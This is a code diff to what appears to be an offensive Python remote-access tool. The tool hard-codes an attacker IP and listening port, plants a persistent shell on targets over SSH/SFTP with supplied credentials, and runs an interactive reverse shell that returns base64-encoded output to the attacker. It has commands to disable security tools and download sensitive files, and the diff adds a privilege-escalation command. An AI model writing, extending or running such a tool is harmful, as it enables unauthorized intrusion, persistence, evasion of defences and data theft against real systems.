@@ -12,7 +12,7 @@ import time
 import base64
 import subprocess
 import threading
-from shell import gather_system_info, scan_ports, list_files, log_output, receive_and_save_file, exploit_sequence, download_sensitive_files, disable_security_tools
+from shell import gather_system_info, scan_ports, list_files, log_output, receive_and_save_file,attempt_privilege_escalation, exploit_sequence, download_sensitive_files, disable_security_tools
 
 ip_connect = "10.0.2.15"  # Attacker's IP
 port_connect = 1337  # Listening port
@@ -357,7 +357,7 @@ def deploy_persistent_shell(target_ip, username, password, ip_connect, port_conn
     ssh.set_missing_host_key_policy(AutoAddPolicy())
     ssh.connect(target_ip, username=username, password=password)
 
-    # SCP upload 
+    # SFTP upload 
     with ssh.open_sftp() as sftp:
         sftp.put("shell.py", "/tmp/shell.py")
 
@@ -442,6 +442,10 @@ def interactive_reverse_shell(ip_connect, port_connect):
                     conn.send(base64.b64encode(disable_output.encode()))
                     log_output("[+] Security tools disabled.")  
 
+                elif command.lower() == "escalate_privileges":  
+                    privilege_output = attempt_privilege_escalation()  
+                    conn.send(base64.b64encode(privilege_output.encode()))  
+                    log_output("[+] Attempted privilege escalation.")
 
                 elif command.startswith("download"):
                     file_path = command.split(" ", 1)[1]
